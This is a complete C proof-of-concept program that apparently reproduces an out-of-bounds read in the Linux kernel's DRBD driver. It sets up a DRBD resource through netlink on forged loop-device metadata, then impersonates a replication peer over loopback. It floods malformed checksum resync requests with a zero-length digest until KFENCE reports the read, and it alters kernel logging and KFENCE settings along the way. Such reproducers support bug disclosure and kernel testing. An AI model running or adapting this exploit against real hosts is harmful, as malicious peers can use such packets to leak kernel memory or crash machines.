// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/mount.h>
#include <sys/sysmacros.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <linux/netlink.h>
#include <linux/genetlink.h>
#include <linux/loop.h>

#define DRBD_FAMILY_NAME "drbd"

enum {
	DRBD_NLA_CFG_REPLY = 1,
	DRBD_NLA_CFG_CONTEXT,
	DRBD_NLA_DISK_CONF,
	DRBD_NLA_RESOURCE_OPTS,
	DRBD_NLA_NET_CONF,
};

enum {
	DRBD_A_DRBD_CFG_CONTEXT_CTX_VOLUME = 1,
	DRBD_A_DRBD_CFG_CONTEXT_CTX_RESOURCE_NAME,
	DRBD_A_DRBD_CFG_CONTEXT_CTX_MY_ADDR,
	DRBD_A_DRBD_CFG_CONTEXT_CTX_PEER_ADDR,
};

enum {
	DRBD_A_DISK_CONF_BACKING_DEV = 1,
	DRBD_A_DISK_CONF_META_DEV,
	DRBD_A_DISK_CONF_META_DEV_IDX,
	DRBD_A_DISK_CONF_DISK_SIZE,
	DRBD_A_DISK_CONF_MAX_BIO_BVECS,
	DRBD_A_DISK_CONF_ON_IO_ERROR,
	DRBD_A_DISK_CONF_FENCING,
	DRBD_A_DISK_CONF_RESYNC_RATE,
	DRBD_A_DISK_CONF_RESYNC_AFTER,
	DRBD_A_DISK_CONF_AL_EXTENTS,
	DRBD_A_DISK_CONF_C_PLAN_AHEAD,
	DRBD_A_DISK_CONF_C_DELAY_TARGET,
	DRBD_A_DISK_CONF_C_FILL_TARGET,
	DRBD_A_DISK_CONF_C_MAX_RATE,
	DRBD_A_DISK_CONF_C_MIN_RATE,
};

enum {
	DRBD_A_NET_CONF_SHARED_SECRET = 1,
	DRBD_A_NET_CONF_CRAM_HMAC_ALG,
	DRBD_A_NET_CONF_INTEGRITY_ALG,
	DRBD_A_NET_CONF_VERIFY_ALG,
	DRBD_A_NET_CONF_CSUMS_ALG,
	DRBD_A_NET_CONF_WIRE_PROTOCOL,
	DRBD_A_NET_CONF_CONNECT_INT,
	DRBD_A_NET_CONF_TIMEOUT,
	DRBD_A_NET_CONF_PING_INT,
	DRBD_A_NET_CONF_PING_TIMEO,
};

enum {
	DRBD_ADM_NEW_MINOR = 5,
	DRBD_ADM_DEL_MINOR,
	DRBD_ADM_NEW_RESOURCE,
	DRBD_ADM_DEL_RESOURCE,
	DRBD_ADM_RESOURCE_OPTS,
	DRBD_ADM_CONNECT,
	DRBD_ADM_DISCONNECT,
	DRBD_ADM_ATTACH,
};

struct drbd_genlmsghdr {
	uint32_t minor;
	int32_t ret_code;
};

#define DRBD_MAGIC		0x83740267
#define DRBD_MAGIC_100		0x8620ec20
#define DRBD_MD_MAGIC_08	(DRBD_MAGIC + 4)

#define MDF_CONSISTENT		(1 << 0)
#define MDF_WAS_UP_TO_DATE	(1 << 4)
#define MDF_AL_CLEAN		(1 << 7)

#define MD_128MB_SECT		(128ULL << 11)

#define P_CSUM_RS_REQUEST	0x21
#define P_PING			0x13
#define P_PING_ACK		0x14
#define P_INITIAL_META		0xfff1
#define P_INITIAL_DATA		0xfff2
#define P_CONNECTION_FEATURES	0xfffe

#define PRO_VERSION_MIN		86
#define PRO_VERSION_MAX		101

#define DRBD_NO_ERROR		101

static void die(const char *m)
{
	fprintf(stderr, "[-] %s: %s\n", m, strerror(errno));
	exit(1);
}

static void put_be16(unsigned char *p, uint16_t v) { p[0] = v >> 8; p[1] = v; }
static void put_be32(unsigned char *p, uint32_t v)
{
	p[0] = v >> 24; p[1] = v >> 16; p[2] = v >> 8; p[3] = v;
}
static void put_be64(unsigned char *p, uint64_t v)
{
	put_be32(p, (uint32_t)(v >> 32));
	put_be32(p + 4, (uint32_t)v);
}
static uint32_t get_be32(const unsigned char *p)
{
	return ((uint32_t)p[0] << 24) | ((uint32_t)p[1] << 16) |
	       ((uint32_t)p[2] << 8) | p[3];
}
static uint16_t get_be16(const unsigned char *p)
{
	return ((uint16_t)p[0] << 8) | p[1];
}

static int write_full(int fd, const void *buf, size_t len)
{
	const char *p = buf;
	while (len) {
		ssize_t n = write(fd, p, len);
		if (n <= 0) {
			if (n < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += n;
		len -= n;
	}
	return 0;
}

static int read_full(int fd, void *buf, size_t len)
{
	char *p = buf;
	while (len) {
		ssize_t n = read(fd, p, len);
		if (n <= 0) {
			if (n < 0 && errno == EINTR)
				continue;
			return -1;
		}
		p += n;
		len -= n;
	}
	return 0;
}

static int nlsock = -1;
static uint16_t drbd_family;
static uint32_t nlseq = 1;

struct nlbuf {
	unsigned char b[4096];
	size_t len;
};

static void nlb_init(struct nlbuf *n, uint16_t type, uint16_t flags,
		     uint8_t cmd, uint8_t version, const void *uhdr,
		     size_t uhdrlen)
{
	struct nlmsghdr *nh = (struct nlmsghdr *)n->b;
	struct genlmsghdr *gh;

	memset(n->b, 0, sizeof(n->b));
	nh->nlmsg_type = type;
	nh->nlmsg_flags = flags;
	nh->nlmsg_seq = nlseq++;
	nh->nlmsg_pid = 0;
	gh = (struct genlmsghdr *)((char *)n->b + NLMSG_HDRLEN);
	gh->cmd = cmd;
	gh->version = version;
	n->len = NLMSG_HDRLEN + GENL_HDRLEN;
	if (uhdrlen) {
		memcpy(n->b + n->len, uhdr, uhdrlen);
		n->len += NLA_ALIGN(uhdrlen);
	}
}

static void nlb_put(struct nlbuf *n, uint16_t type, const void *data,
		    size_t dlen)
{
	struct nlattr *a = (struct nlattr *)(n->b + n->len);

	a->nla_type = type;
	a->nla_len = NLA_HDRLEN + dlen;
	if (dlen)
		memcpy((char *)a + NLA_HDRLEN, data, dlen);
	n->len += NLA_ALIGN(a->nla_len);
}

static void nlb_put_u32(struct nlbuf *n, uint16_t type, uint32_t v)
{
	nlb_put(n, type, &v, sizeof(v));
}

static void nlb_put_str(struct nlbuf *n, uint16_t type, const char *s)
{
	nlb_put(n, type, s, strlen(s) + 1);
}

static size_t nlb_nest_start(struct nlbuf *n, uint16_t type)
{
	struct nlattr *a = (struct nlattr *)(n->b + n->len);
	size_t off = n->len;

	a->nla_type = type | NLA_F_NESTED;
	a->nla_len = NLA_HDRLEN;
	n->len += NLA_HDRLEN;
	return off;
}

static void nlb_nest_end(struct nlbuf *n, size_t off)
{
	struct nlattr *a = (struct nlattr *)(n->b + off);

	a->nla_len = n->len - off;
}

static int nl_open(void)
{
	struct sockaddr_nl sa;

	nlsock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
	if (nlsock < 0)
		return -1;
	memset(&sa, 0, sizeof(sa));
	sa.nl_family = AF_NETLINK;
	if (bind(nlsock, (struct sockaddr *)&sa, sizeof(sa)) < 0)
		return -1;
	return 0;
}

static int nl_talk(struct nlbuf *n, unsigned char *reply, size_t rlen)
{
	struct nlmsghdr *nh = (struct nlmsghdr *)n->b;
	ssize_t r;

	nh->nlmsg_len = n->len;
	if (send(nlsock, n->b, n->len, 0) < 0)
		return -errno;

	for (;;) {
		r = recv(nlsock, reply, rlen, 0);
		if (r < 0)
			return -errno;
		nh = (struct nlmsghdr *)reply;
		if (nh->nlmsg_type == NLMSG_ERROR) {
			struct nlmsgerr *e = (struct nlmsgerr *)NLMSG_DATA(nh);

			return e->error ? e->error : 0;
		}
		return (int)r;
	}
}

static int resolve_family(void)
{
	struct nlbuf n;
	unsigned char rep[4096];
	struct nlmsghdr *nh;
	struct nlattr *a;
	int rlen, left;

	nlb_init(&n, GENL_ID_CTRL, NLM_F_REQUEST, CTRL_CMD_GETFAMILY, 1, NULL, 0);
	nlb_put_str(&n, CTRL_ATTR_FAMILY_NAME, DRBD_FAMILY_NAME);
	rlen = nl_talk(&n, rep, sizeof(rep));
	if (rlen < 0)
		return rlen;
	nh = (struct nlmsghdr *)rep;
	a = (struct nlattr *)((char *)rep + NLMSG_HDRLEN + GENL_HDRLEN);
	left = nh->nlmsg_len - NLMSG_HDRLEN - GENL_HDRLEN;
	while (left >= (int)NLA_HDRLEN && a->nla_len >= NLA_HDRLEN) {
		if ((a->nla_type & NLA_TYPE_MASK) == CTRL_ATTR_FAMILY_ID) {
			drbd_family = *(uint16_t *)((char *)a + NLA_HDRLEN);
			return 0;
		}
		left -= NLA_ALIGN(a->nla_len);
		a = (struct nlattr *)((char *)a + NLA_ALIGN(a->nla_len));
	}
	return -ENOENT;
}

static int drbd_cmd(struct nlbuf *n, const char *what)
{
	unsigned char rep[8192];
	struct nlmsghdr *nh;
	struct drbd_genlmsghdr *dh;
	int rlen;

	rlen = nl_talk(n, rep, sizeof(rep));
	if (rlen < 0) {
		printf("[-] %s: netlink error %d (%s)\n", what, rlen,
		       strerror(-rlen));
		return rlen;
	}
	nh = (struct nlmsghdr *)rep;
	if (nh->nlmsg_len < NLMSG_HDRLEN + GENL_HDRLEN + sizeof(*dh)) {
		printf("[-] %s: short reply\n", what);
		return -1;
	}
	dh = (struct drbd_genlmsghdr *)((char *)rep + NLMSG_HDRLEN + GENL_HDRLEN);
	printf("[*] %s -> ret_code %d\n", what, dh->ret_code);
	return dh->ret_code;
}

static char *workdir = "/tmp";

static int make_loop(const char *fname, unsigned long long size, char *devout,
		     const void *hdr, size_t hdrlen)
{
	char path[256];
	int fd, lc, ld, n;

	snprintf(path, sizeof(path), "%s/%s", workdir, fname);
	fd = open(path, O_RDWR | O_CREAT | O_TRUNC, 0600);
	if (fd < 0)
		return -1;
	if (ftruncate(fd, size) < 0)
		return -1;
	if (hdrlen && write_full(fd, hdr, hdrlen) < 0)
		return -1;
	fsync(fd);

	lc = open("/dev/loop-control", O_RDWR);
	if (lc < 0)
		return -1;
	n = ioctl(lc, LOOP_CTL_GET_FREE);
	close(lc);
	if (n < 0)
		return -1;
	snprintf(devout, 64, "/dev/loop%d", n);
	ld = open(devout, O_RDWR);
	if (ld < 0) {
		mknod(devout, S_IFBLK | 0600, makedev(7, n));
		ld = open(devout, O_RDWR);
	}
	if (ld < 0)
		return -1;
	if (ioctl(ld, LOOP_SET_FD, fd) < 0)
		return -1;
	close(fd);

	return ld;
}

static void build_md(unsigned char *md, unsigned long long la_size_sect)
{
	memset(md, 0, 4096);
	put_be64(md + 0, la_size_sect);
	put_be64(md + 8, 0x0123456789abcde0ULL);
	put_be64(md + 40, 0x1122334455667788ULL);
	put_be32(md + 56, MDF_CONSISTENT | MDF_WAS_UP_TO_DATE | MDF_AL_CLEAN);
	put_be32(md + 60, DRBD_MD_MAGIC_08);
	put_be32(md + 64, (uint32_t)MD_128MB_SECT);
	put_be32(md + 68, 8);
	put_be32(md + 72, 1237);
	put_be32(md + 76, 8 + 64);
	put_be32(md + 80, 4096);
	put_be32(md + 84, 0);
	put_be32(md + 88, 1);
	put_be32(md + 92, 8);
}

#define MY_PORT   7789
#define PEER_PORT 7790

static int data_fd = -1, meta_fd = -1;
static volatile int proto100;
static volatile int stop_flag;
static volatile unsigned long rs_replies;

static int send_hdr80(int fd, uint16_t cmd, uint16_t len)
{
	unsigned char h[8];

	put_be32(h, DRBD_MAGIC);
	put_be16(h + 4, cmd);
	put_be16(h + 6, len);
	return write_full(fd, h, sizeof(h));
}

static int send_hdr100(int fd, uint16_t vol, uint16_t cmd, uint32_t len)
{
	unsigned char h[16];

	put_be32(h, DRBD_MAGIC_100);
	put_be16(h + 4, vol);
	put_be16(h + 6, cmd);
	put_be32(h + 8, len);
	put_be32(h + 12, 0);
	return write_full(fd, h, sizeof(h));
}

static int recv_packet(int fd, uint32_t *plen)
{
	unsigned char h[16];
	uint32_t magic;
	uint16_t cmd;
	uint32_t len;
	char sink[4096];

	if (read_full(fd, h, 8) < 0)
		return -1;
	magic = get_be32(h);
	if (magic == DRBD_MAGIC_100) {
		if (read_full(fd, h + 8, 8) < 0)
			return -1;
		cmd = get_be16(h + 6);
		len = get_be32(h + 8);
		proto100 = 1;
	} else if (magic == DRBD_MAGIC) {
		cmd = get_be16(h + 4);
		len = get_be16(h + 6);
	} else if ((magic >> 16) == 0x835a) {
		cmd = (uint16_t)(magic & 0xffff);
		len = get_be32(h + 4);
	} else {
		fprintf(stderr, "[-] bad magic %08x\n", magic);
		return -1;
	}
	*plen = len;
	while (len) {
		size_t c = len > sizeof(sink) ? sizeof(sink) : len;

		if (read_full(fd, sink, c) < 0)
			return -1;
		len -= c;
	}
	return cmd;
}

static void *data_drain(void *arg)
{
	uint32_t len;

	(void)arg;
	while (!stop_flag) {
		int cmd = recv_packet(data_fd, &len);

		if (cmd < 0)
			break;
		if (cmd == 0x02 )
			rs_replies++;
	}
	return NULL;
}

static void *meta_drain(void *arg)
{
	uint32_t len;

	(void)arg;
	while (!stop_flag) {
		int cmd = recv_packet(meta_fd, &len);

		if (cmd < 0)
			break;
		if (cmd == P_PING) {
			if (proto100)
				send_hdr100(meta_fd, 0, P_PING_ACK, 0);
			else
				send_hdr80(meta_fd, P_PING_ACK, 0);
		}
	}
	return NULL;
}

static volatile int kfence_hit;

static void *kmsg_watch(void *arg)
{
	char buf[8192];
	int fd;

	(void)arg;
	fd = open("/dev/kmsg", O_RDONLY | O_NONBLOCK);
	if (fd < 0)
		return NULL;
	lseek(fd, 0, SEEK_END);
	while (!stop_flag) {
		ssize_t n = read(fd, buf, sizeof(buf) - 1);

		if (n > 0) {
			buf[n] = 0;
			if (strstr(buf, "KFENCE"))
				kfence_hit = 1;
			continue;
		}
		usleep(20000);
	}
	close(fd);
	return NULL;
}

static int connect_to_drbd(void)
{
	struct sockaddr_in sa;
	int fd, i;

	memset(&sa, 0, sizeof(sa));
	sa.sin_family = AF_INET;
	sa.sin_port = htons(MY_PORT);
	sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

	for (i = 0; i < 400; i++) {
		fd = socket(AF_INET, SOCK_STREAM, 0);
		if (fd < 0)
			return -1;
		if (connect(fd, (struct sockaddr *)&sa, sizeof(sa)) == 0) {
			int one = 1;

			setsockopt(fd, IPPROTO_TCP, TCP_NODELAY, &one, sizeof(one));
			return fd;
		}
		close(fd);
		usleep(25000);
	}
	return -1;
}

static void set_loglevel(void)
{
	int fd = open("/proc/sys/kernel/printk", O_WRONLY);

	if (fd >= 0) {

		write(fd, "5 4 1 7\n", 8);
		close(fd);
	}

	fd = open("/sys/module/kfence/parameters/skip_covered_thresh", O_WRONLY);
	if (fd >= 0) {
		write(fd, "100\n", 4);
		close(fd);
	}
}

int main(void)
{
	unsigned char md[4096];
	char data_dev[64], meta_dev[64];
	struct nlbuf n;
	struct drbd_genlmsghdr dh;
	struct sockaddr_in my_addr, peer_addr;
	size_t nest;
	pthread_t th_data, th_meta, th_kmsg;
	unsigned char feat[72];
	unsigned char req[24];
	unsigned long sent = 0;
	int rc, i;

	setvbuf(stdout, NULL, _IONBF, 0);
	set_loglevel();

	if (access("/tmp", W_OK) != 0) {
		mkdir("/mnt", 0755);
		if (mount("none", "/mnt", "tmpfs", 0, "size=512M") == 0)
			workdir = "/mnt";
	}
	printf("[*] workdir = %s\n", workdir);

	build_md(md, 32768 );
	if (make_loop("drbd_data.img", 16ULL << 20, data_dev, NULL, 0) < 0)
		die("data loop");
	if (make_loop("drbd_meta.img", MD_128MB_SECT * 512, meta_dev, md,
		      sizeof(md)) < 0)
		die("meta loop");
	printf("[*] backing=%s meta=%s\n", data_dev, meta_dev);

	if (nl_open() < 0)
		die("netlink socket");
	if (resolve_family() < 0) {
		fprintf(stderr, "[-] no \"drbd\" genl family (CONFIG_BLK_DEV_DRBD?)\n");
		return 1;
	}
	printf("[*] drbd genl family id = %u\n", drbd_family);

	memset(&dh, 0, sizeof(dh));
	dh.minor = (uint32_t)-1;
	nlb_init(&n, drbd_family, NLM_F_REQUEST, DRBD_ADM_NEW_RESOURCE, 1,
		 &dh, sizeof(dh));
	nest = nlb_nest_start(&n, DRBD_NLA_CFG_CONTEXT);
	nlb_put_str(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_RESOURCE_NAME, "r0");
	nlb_nest_end(&n, nest);
	if (drbd_cmd(&n, "new-resource") != DRBD_NO_ERROR)
		return 1;

	memset(&dh, 0, sizeof(dh));
	dh.minor = 0;
	nlb_init(&n, drbd_family, NLM_F_REQUEST, DRBD_ADM_NEW_MINOR, 1,
		 &dh, sizeof(dh));
	nest = nlb_nest_start(&n, DRBD_NLA_CFG_CONTEXT);
	nlb_put_str(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_RESOURCE_NAME, "r0");
	nlb_put_u32(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_VOLUME, 0);
	nlb_nest_end(&n, nest);
	if (drbd_cmd(&n, "new-minor") != DRBD_NO_ERROR)
		return 1;

	memset(&dh, 0, sizeof(dh));
	dh.minor = 0;
	nlb_init(&n, drbd_family, NLM_F_REQUEST, DRBD_ADM_ATTACH, 1,
		 &dh, sizeof(dh));
	nest = nlb_nest_start(&n, DRBD_NLA_DISK_CONF);
	nlb_put_str(&n, DRBD_A_DISK_CONF_BACKING_DEV, data_dev);
	nlb_put_str(&n, DRBD_A_DISK_CONF_META_DEV, meta_dev);
	nlb_put_u32(&n, DRBD_A_DISK_CONF_META_DEV_IDX, 0);
	nlb_put_u32(&n, DRBD_A_DISK_CONF_C_MIN_RATE, 0);
	nlb_put_u32(&n, DRBD_A_DISK_CONF_C_MAX_RATE, 500000);
	nlb_nest_end(&n, nest);
	if (drbd_cmd(&n, "attach") != DRBD_NO_ERROR)
		return 1;

	memset(&my_addr, 0, sizeof(my_addr));
	my_addr.sin_family = AF_INET;
	my_addr.sin_port = htons(MY_PORT);
	my_addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
	peer_addr = my_addr;
	peer_addr.sin_port = htons(PEER_PORT);

	memset(&dh, 0, sizeof(dh));
	dh.minor = (uint32_t)-1;
	nlb_init(&n, drbd_family, NLM_F_REQUEST, DRBD_ADM_CONNECT, 1,
		 &dh, sizeof(dh));
	nest = nlb_nest_start(&n, DRBD_NLA_CFG_CONTEXT);
	nlb_put_str(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_RESOURCE_NAME, "r0");
	nlb_put(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_MY_ADDR, &my_addr,
		sizeof(my_addr));
	nlb_put(&n, DRBD_A_DRBD_CFG_CONTEXT_CTX_PEER_ADDR, &peer_addr,
		sizeof(peer_addr));
	nlb_nest_end(&n, nest);
	nest = nlb_nest_start(&n, DRBD_NLA_NET_CONF);
	nlb_put_str(&n, DRBD_A_NET_CONF_CSUMS_ALG, "sha512");
	nlb_put_u32(&n, DRBD_A_NET_CONF_PING_INT, 30);
	nlb_put_u32(&n, DRBD_A_NET_CONF_CONNECT_INT, 1);
	nlb_nest_end(&n, nest);

	rc = drbd_cmd(&n, "connect");
	if (rc < 1)
		return 1;

	data_fd = connect_to_drbd();
	if (data_fd < 0)
		die("connect data socket");
	if (send_hdr80(data_fd, P_INITIAL_DATA, 0) < 0)
		die("send P_INITIAL_DATA");
	printf("[*] data socket up\n");

	usleep(200000);

	meta_fd = connect_to_drbd();
	if (meta_fd < 0)
		die("connect meta socket");
	if (send_hdr80(meta_fd, P_INITIAL_META, 0) < 0)
		die("send P_INITIAL_META");
	printf("[*] meta socket up\n");

	memset(feat, 0, sizeof(feat));
	put_be32(feat + 0, PRO_VERSION_MIN);
	put_be32(feat + 4, 0);
	put_be32(feat + 8, PRO_VERSION_MAX);
	if (send_hdr80(data_fd, P_CONNECTION_FEATURES, sizeof(feat)) < 0 ||
	    write_full(data_fd, feat, sizeof(feat)) < 0)
		die("send features");

	pthread_create(&th_data, NULL, data_drain, NULL);
	pthread_create(&th_meta, NULL, meta_drain, NULL);

	for (i = 0; i < 200 && !proto100; i++)
		usleep(50000);
	if (!proto100) {
		fprintf(stderr, "[-] handshake did not reach protocol 100\n");
		return 1;
	}
	printf("[+] handshake done, agreed protocol >= 100\n");
	sleep(1);

	printf("[*] flooding P_CSUM_RS_REQUEST (declared len == sizeof(p_block_req),\n"
	       "    i.e. digest length 0 -> di->digest points at the end of a 16-byte object)\n");

	pthread_create(&th_kmsg, NULL, kmsg_watch, NULL);

	for (i = 0; i < 40000 && !kfence_hit; i++) {
		uint64_t sector = (uint64_t)((i % 2048) * 8);

		memset(req, 0, sizeof(req));
		put_be64(req + 0, sector);
		put_be64(req + 8, 0xdead0000ULL + i);
		put_be32(req + 16, 4096);
		put_be32(req + 20, 0);

		if (send_hdr100(data_fd, 0, P_CSUM_RS_REQUEST, sizeof(req)) < 0)
			break;
		if (write_full(data_fd, req, sizeof(req)) < 0)
			break;
		sent++;

		if ((sent % 200) == 0)
			usleep(400000);
	}

	sleep(2);
	printf("[*] sent %lu requests, %lu RS replies, kfence_hit=%d\n",
	       sent, rs_replies, kfence_hit);
	if (kfence_hit)
		printf("[+] PROVED: KFENCE out-of-bounds read triggered\n");
	stop_flag = 1;
	sleep(1);
	return 0;
}
